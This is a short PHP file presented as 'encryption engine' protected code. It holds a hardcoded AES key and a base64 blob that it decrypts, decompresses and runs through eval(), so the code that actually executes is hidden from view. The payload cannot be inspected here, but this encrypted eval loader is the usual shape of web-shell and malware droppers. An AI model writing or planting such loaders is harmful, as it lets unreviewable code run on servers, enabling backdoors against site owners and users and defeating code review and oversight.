<?php
/* PROTECTED BY TALISMAN ENCRYPTION ENGINE v2.0 */
$kee505 = 'Talisman_Ultimate_WebSuite_2026_SecureKey!';
$pf05d0 = base64_decode('o6A0HXHJ48XoEDe976QFhm5od0RBdWN1eGROZXE5V011b1FuZytQSXlPc0NMV3NzdVd4aGpoTWYxNTFKcjhWbm9USjZMOFhvbzBXd0lJYlV4RE9NQjJUSVp6b0hDdTZpM0YvMFhMNDZUVVp4MEplUGNCVCtYbzNUN3Q2Um9IZHpOeWtEekwweHgxbmZvdktrazBrZmh1QnNrR1pxcVNjbVcyWkRaaVM3eWF5S3V5SGNjaysyNDVUZTdGSFpGV2ZEOEJhMHlyTWYveU5vM05LMFQrSUZ0VW51ZHRQM2o2RkR2T1JtZFozdEpHY0xFc2RiVC9kUmpqNDgrN2lvdGl0NktuNEVCVmowRHBOK3p2YUJ2aktQbExTQkxzMS9aMTEwbzl4RWNNUlFpRjZHYzFicnBpN2swalp5Unk2cFk4eGdiNVp4UkZ1bnZkb2l2bzlB');
$ie1b5b = openssl_cipher_iv_length('aes-256-cbc');
$v29d3e = substr($pf05d0, 0, $ie1b5b);
$c610af = substr($pf05d0, $ie1b5b);
eval('?>'.gzinflate(openssl_decrypt($c610af, 'aes-256-cbc', $kee505, 0, $v29d3e)));